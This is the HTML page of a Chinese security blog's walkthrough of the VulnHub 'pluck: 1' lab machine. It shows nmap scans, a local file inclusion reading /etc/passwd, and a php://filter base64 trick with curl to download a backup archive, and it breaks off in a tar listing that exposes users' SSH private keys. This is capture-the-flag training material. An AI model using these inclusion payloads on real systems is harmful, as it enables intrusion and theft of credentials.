@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：pluck: 1发布日期：2017年3月11日 下载pluck.ova.zip  Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;pluck&#x2F;pluck.ova.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;pluck&#x2F;pluck.ova.zip.torrent  描述“享受” —">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[pluck-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/04/08/pluck-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：pluck: 1发布日期：2017年3月11日 下载pluck.ova.zip  Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;pluck&#x2F;pluck.ova.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;pluck&#x2F;pluck.ova.zip.torrent  描述“享受” —">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub242.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub243.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub244.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub245.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-04-08T07:03:05.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:56:05.102Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub242.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/04/08/pluck-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/04/08/pluck-1/","path":"2020/04/08/pluck-1/","title":"vulnhub靶机渗透[pluck-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[pluck-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-number">6.</span> <span class="nav-text">提权2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">知识点总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/04/08/pluck-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[pluck-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[pluck-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-04-08 15:03:05" itemprop="dateCreated datePublished" datetime="2020-04-08T15:03:05+08:00">2020-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:56:05" itemprop="dateModified" datetime="2020-08-17T00:56:05+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：pluck: 1<br>发布日期：2017年3月11日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>pluck.ova.zip</p>
+<ul>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wbHVjay9wbHVjay5vdmEuemlw">https://download.vulnhub.com/pluck/pluck.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wbHVjay9wbHVjay5vdmEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/pluck/pluck.ova.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>“享受” — @ryanoberto</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.121</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.56.121</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">5355/tcp open  llmnr?</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 22,80,3306,5355 -v 192.168.56.121 -T4 --script=vuln</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.121</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.121:80/admin.php</span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: admin.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.121:80/index.php?page=contact.php</span><br><span class="line">|     Form <span class="built_in">id</span>: message</span><br><span class="line">|_    Form action: <span class="comment">#</span></span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">| http-passwd: Directory traversal found.</span></span><br><span class="line"><span class="string">| Payload: &quot;%2F%2Fetc%2Fpasswd&quot;</span></span><br><span class="line"><span class="string">| Printing first 250 bytes:</span></span><br><span class="line"><span class="string">| &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">| &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;head&gt;</span></span><br><span class="line"><span class="string">| &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span></span><br><span class="line"><span class="string">| &lt;title&gt;Pluck&lt;/title&gt;</span></span><br><span class="line"><span class="string">|_&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/bootstrap</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.56.121:80/search?forcedict=resolve%27%20OR%20sqlspider&amp;q=define%2bresolve&amp;ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&amp;sa=X</span><br><span class="line">|     http://192.168.56.121:80/search?forcedict=resolve&amp;q=define%2bresolve%27%20OR%20sqlspider&amp;ved=0ahUKEwiK9crGrc3RAhXpCsAKHYomC50Q_SoISDAA&amp;sa=X</span><br><span class="line">|     http://192.168.56.121:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.121:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|   Possible sqli <span class="keyword">for</span> forms:</span><br><span class="line">|     Form at path: /admin.php, form<span class="string">&#x27;s action: admin.php. Fields that might be vulnerable:</span></span><br><span class="line"><span class="string">|_      email</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5355/tcp open  llmnr?</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>
+
+<p>端口80上的网站由PHP驱动，尝试了许多PHP技巧来检查漏洞，并发现该网站容易受到LFI和PHP base64-encode技巧的攻击！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.121/index.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub242.jpg"></li>
+</ul>
+<p>现在得到了一个用户列表：</p>
+<ul>
+<li>bob</li>
+<li>peter</li>
+<li>paul</li>
+<li>backup-user</li>
+</ul>
+<p>确实尝试过暴力破解，SQLi的管理员登录页面，但是运气不太好。</p>
+<p>接下来，返回到用户列表，并尝试包含备份用户登录shell中提到的备份脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.121/index.php?page=/usr/local/scripts/backup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash ######################## # Server Backup script # ######################## #Backup directories in /backups so we can get it via tftp echo &quot;Backing up data&quot; tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2&amp; &gt; /dev/null echo &quot;Backup complete&quot; </span></span><br></pre></td></tr></table></figure>
+
+<p>可以尝试包含tar文件，但这将是一团糟！因此，利用PHP base64编码技巧，通过对backup.tar文件的数据进行编码，然后剪切周围的HTML并在本地对其进行解码，来安全地下载文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># curl http://192.168.56.121/index.php?page=php://filter/convert.base64-encode/resource=/backups/backup.tar | grep &#x27;jumbotron&gt;&#x27; | cut -d &#x27;&gt;&#x27; -f 2 | cut -d &#x27;&lt;&#x27; -f 1 &gt; backup.tar64</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 2361k    0 2361k    0     0  32.0M      0 --:--:-- --:--:-- --:--:-- 32.0M</span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup.tar64</span><br></pre></td></tr></table></figure>
+
+<p>base64解码生成backup.tar</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># base64 -d backup.tar64 &gt; backup.tar</span></span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup.tar  backup.tar64</span><br></pre></td></tr></table></figure>
+
+<p>最后进行解压缩操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># mkdir backup ; tar -xvf backup.tar -C backup</span></span><br><span class="line">home/</span><br><span class="line">home/bob/</span><br><span class="line">home/bob/.bashrc</span><br><span class="line">home/bob/.sudo_as_admin_successful</span><br><span class="line">home/bob/.profile</span><br><span class="line">home/bob/.bash_logout</span><br><span class="line">home/paul/</span><br><span class="line">home/paul/keys/</span><br><span class="line">home/paul/keys/id_key3.pub</span><br><span class="line">home/paul/keys/id_key2.pub</span><br><span class="line">home/paul/keys/id_key2</span><br><span class="line">home/paul/keys/id_key4.pub</span><br><span class="line">home/paul/keys/id_key5.pub</span><br><span class="line">home/paul/keys/id_key6</span><br><span class="line">home/paul/keys/id_key1</span><br><span class="line">home/paul/keys/id_key5</span><br><span class="line">home/paul/keys/id_key1.pub</span><br><span class="line">home/paul/keys/id_key6.pub</span><br><span class="line">home/paul/keys/id_key4</span><br><span class="line">home/paul/keys/id_key3</span><br><span 